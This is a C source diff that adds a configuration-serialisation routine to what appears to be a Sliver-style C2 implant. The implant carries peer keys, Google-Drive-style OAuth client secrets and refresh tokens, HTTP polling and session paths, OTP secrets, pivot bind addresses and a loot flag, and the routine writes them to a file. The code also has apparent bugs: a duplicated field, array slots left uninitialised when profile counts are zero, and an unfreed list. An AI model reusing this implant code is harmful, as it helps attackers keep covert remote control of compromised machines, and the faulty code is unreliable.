@@ -52,6 +52,7 @@ VOID FreeGlobalConfig
 	DWORD i = 0;
 
 	if (pConfig != NULL) {
+		FREE(pConfig->lpConfigPath);
 		FREE(pConfig->pSessionKey);
 		FREE(pConfig->pPeerSessionKey);
 		FREE(pConfig->lpRecipientPubKey);
@@ -948,6 +949,143 @@ UINT64 GeneratePeerID()
 	FREE(pRandomBytes);
 
 	return uResult;
+}
+
+VOID MarshalConfig
+(
+	_In_ PGLOBAL_CONFIG pConfig
+)
+{
+	PPBElement ConfigElements[17];
+	PPBElement DriveElements[10];
+	PPBElement* DriveList = NULL;
+	PPBElement HttpElements[12];
+	PPBElement* HttpList = NULL;
+	PPBElement PivotElements[1];
+	PPBElement* PivotList = NULL;
+	PDRIVE_PROFILE pDriveProfile = NULL;
+	PHTTP_PROFILE pHttpProfile = NULL;
+	PPIVOT_PROFILE pPivotProfile = NULL;
+	PBUFFER* pBufferList = NULL;
+	DWORD i = 0;
+	DWORD j = 0;
+	PPBElement FinalElement = NULL;
+
+	ConfigElements[0] = CreateBytesElement(pConfig->lpRecipientPubKey, lstrlenA(pConfig->lpRecipientPubKey), 1);
+	ConfigElements[1] = CreateBytesElement(pConfig->lpPeerPubKey, lstrlenA(pConfig->lpPeerPubKey), 2);
+	ConfigElements[2] = CreateBytesElement(pConfig->lpPeerPrivKey, lstrlenA(pConfig->lpPeerPrivKey), 3);
+	ConfigElements[3] = CreateBytesElement(pConfig->lpServerMinisignPublicKey, lstrlenA(pConfig->lpServerMinisignPublicKey), 4);
+	ConfigElements[4] = CreateBytesElement(pConfig->lpSliverName, lstrlenA(pConfig->lpSliverName), 5);
+	ConfigElements[5] = CreateBytesElement(pConfig->lpConfigID, lstrlenA(pConfig->lpConfigID), 6);
+	ConfigElements[6] = CreateBytesElement(pConfig->lpPeerAgePublicKeySignature, lstrlenA(pConfig->lpPeerAgePublicKeySignature), 7);
+	ConfigElements[7] = CreateVarIntElement(pConfig->uEncoderNonce, 8);
+	ConfigElements[8] = CreateVarIntElement(pConfig->dwMaxFailure, 9);
+	ConfigElements[9] = CreateVarIntElement(pConfig->dwReconnectInterval, 10);
+	ConfigElements[10] = CreateBytesElement(pConfig->lpScriptPath, lstrlenA(pConfig->lpScriptPath), 11);
+	ConfigElements[11] = CreateVarIntElement(pConfig->Protocol, 12);
+	ConfigElements[12] = CreateVarIntElement(pConfig->Type, 13);
+
+	if (pConfig->cDriveProfiles > 0) {
+		DriveList = ALLOC(sizeof(PPBElement) * pConfig->cDriveProfiles);
+		for (i = 0; i < pConfig->cDriveProfiles; i++) {
+			pDriveProfile = pConfig->DriveProfiles[i];
+			DriveElements[0] = CreateBytesElement(pDriveProfile->lpClientID, lstrlenA(pDriveProfile->lpClientID), 1);
+			DriveElements[1] = CreateBytesElement(pDriveProfile->lpClientSecret, lstrlenA(pDriveProfile->lpClientSecret), 2);
+			DriveElements[2] = CreateBytesElement(pDriveProfile->lpRefreshToken, lstrlenA(pDriveProfile->lpRefreshToken), 3);
+			DriveElements[3] = CreateBytesElement(pDriveProfile->lpUserAgent, lstrlenA(pDriveProfile->lpUserAgent), 4);
+			DriveElements[4] = CreateBytesElement(pDriveProfile->lpStartExtension, lstrlenA(pDriveProfile->lpStartExtension), 5);
+			DriveElements[5] = CreateBytesElement(pDriveProfile->lpRecvExtension, lstrlenA(pDriveProfile->lpRecvExtension), 6);
+			DriveElements[6] = CreateBytesElement(pDriveProfile->lpRegisterExtension, lstrlenA(pDriveProfile->lpRegisterExtension), 7);
+			DriveElements[7] = CreateBytesElement(pDriveProfile->lpRegisterExtension, lstrlenA(pDriveProfile->lpRegisterExtension), 8);
+			DriveElements[8] = CreateBytesElement(pDriveProfile->lpCloseExtension, lstrlenA(pDriveProfile->lpCloseExtension), 9);
+			DriveElements[9] = CreateVarIntElement(pDriveProfile->dwPollInterval, 10);
+			DriveList[i] = CreateStructElement(DriveElements, _countof(DriveElements), 0);
+		}
+
+		ConfigElements[13] = CreateRepeatedStructElement(DriveList, pConfig->cDriveProfiles, 14);
+		FREE(DriveList);
+	}
+
+	if (pConfig->cHttpProfiles > 0) {
+		HttpList = ALLOC(sizeof(PPBElement) * pConfig->cHttpProfiles);
+		for (i = 0; i < pConfig->cHttpProfiles; i++) {
+			pHttpProfile = pConfig->HttpProfiles[i];
+			pBufferList = ALLOC(sizeof(PBUFFER) * pHttpProfile->cPollPaths);
+			for (j = 0; j < pHttpProfile->cPollPaths; j++) {
+				pBufferList[j] = BufferInit(pHttpProfile->PollPaths[j], lstrlenA(pHttpProfile->PollPaths[j]));
+			}
+
+			HttpElements[0] = CreateRepeatedBytesElement(pBufferList, pHttpProfile->cPollPaths, 1);
+			FreeBufferList(pBufferList, pHttpProfile->cPollPaths);
+
+			pBufferList = ALLOC(sizeof(PBUFFER) * pHttpProfile->cPollFiles);
+			for (j = 0; j < pHttpProfile->cPollFiles; j++) {
+				pBufferList[j] = BufferInit(pHttpProfile->PollFiles[j], lstrlenA(pHttpProfile->PollFiles[j]));
+			}
+
+			HttpElements[1] = CreateRepeatedBytesElement(pBufferList, pHttpProfile->cPollFiles, 2);
+			FreeBufferList(pBufferList, pHttpProfile->cPollFiles);
+
+			pBufferList = ALLOC(sizeof(PBUFFER) * pHttpProfile->cSessionPaths);
+			for (j = 0; j < pHttpProfile->cSessionPaths; j++) {
+				pBufferList[j] = BufferInit(pHttpProfile->SessionPaths[j], lstrlenA(pHttpProfile->SessionPaths[j]));
+			}
+
+			HttpElements[2] = CreateRepeatedBytesElement(pBufferList, pHttpProfile->cSessionPaths, 3);
+			FreeBufferList(pBufferList, pHttpProfile->cSessionPaths);
+
+			pBufferList = ALLOC(sizeof(PBUFFER) * pHttpProfile->cSessionFiles);
+			for (j = 0; j < pHttpProfile->cSessionFiles; j++) {
+				pBufferList[j] = BufferInit(pHttpProfile->SessionFiles[j], lstrlenA(pHttpProfile->SessionFiles[j]));
+			}
+
+			HttpElements[3] = CreateRepeatedBytesElement(pBufferList, pHttpProfile->cSessionFiles, 4);
+			FreeBufferList(pBufferList, pHttpProfile->cSessionFiles);
+
+			pBufferList = ALLOC(sizeof(PBUFFER) * pHttpProfile->cClosePaths);
+			for (j = 0; j < pHttpProfile->cClosePaths; j++) {
+				pBufferList[j] = BufferInit(pHttpProfile->ClosePaths[j], lstrlenA(pHttpProfile->ClosePaths[j]));
+			}
+
+			HttpElements[4] = CreateRepeatedBytesElement(pBufferList, pHttpProfile->cClosePaths, 5);
+			FreeBufferList(pBufferList, pHttpProfile->cClosePaths);
+
+			pBufferList = ALLOC(sizeof(PBUFFER) * pHttpProfile->cCloseFiles);
+			for (j = 0; j < pHttpProfile->cCloseFiles; j++) {
+				pBufferList[j] = BufferInit(pHttpProfile->CloseFiles[j], lstrlenA(pHttpProfile->CloseFiles[j]));
+			}
+
+			HttpElements[5] = CreateRepeatedBytesElement(pBufferList, pHttpProfile->cCloseFiles, 6);
+			FreeBufferList(pBufferList, pHttpProfile->cCloseFiles);
+
+			HttpElements[6] = CreateBytesElement(pHttpProfile->lpUserAgent, lstrlenA(pHttpProfile->lpUserAgent), 7);
+			HttpElements[7] = CreateBytesElement(pHttpProfile->lpOtpSecret, lstrlenA(pHttpProfile->lpOtpSecret), 8);
+			HttpElements[8] = CreateVarIntElement(pHttpProfile->dwMinNumberOfSegments, 9);
+			HttpElements[9] = CreateVarIntElement(pHttpProfile->dwMaxNumberOfSegments, 10);
+			HttpElements[10] = CreateVarIntElement(pHttpProfile->dwPollInterval, 11);
+			HttpElements[11] = CreateBytesElement(pHttpProfile->lpUrl, lstrlenA(pHttpProfile->lpUrl), 12);
+			HttpList[i] = CreateStructElement(HttpElements, _countof(HttpElements), 0);
+		}
+
+		ConfigElements[14] = CreateRepeatedStructElement(HttpList, pConfig->cHttpProfiles, 15);
+		FREE(HttpList);
+	}
+
+	if (pConfig->cPivotProfiles > 0) {
+		PivotList = ALLOC(sizeof(PPBElement) * pConfig->cPivotProfiles);
+		for (i = 0; i < pConfig->cPivotProfiles; i++) {
+			pPivotProfile = pConfig->PivotProfiles[i];
+			PivotElements[0] = CreateBytesElement(pPivotProfile->lpBindAddress, lstrlenA(pPivotProfile->lpBindAddress), 1);
+			PivotList[i] = CreateStructElement(PivotElements, _countof(PivotElements), 0);
+		}
+
+		ConfigElements[15] = CreateRepeatedStructElement(PivotList, pConfig->cPivotProfiles, 16);
+	}
+
+	ConfigElements[16] = CreateVarIntElement(pConfig->Loot, 17);
+	FinalElement = CreateStructElement(ConfigElements, _countof(ConfigElements), 0);
+	WriteToFile(pConfig->lpConfigPath, FinalElement->pMarshaledData, FinalElement->cbMarshaledData);
+	FreeElement(FinalElement);
 }
 
 PGLOBAL_CONFIG UnmarshalConfig
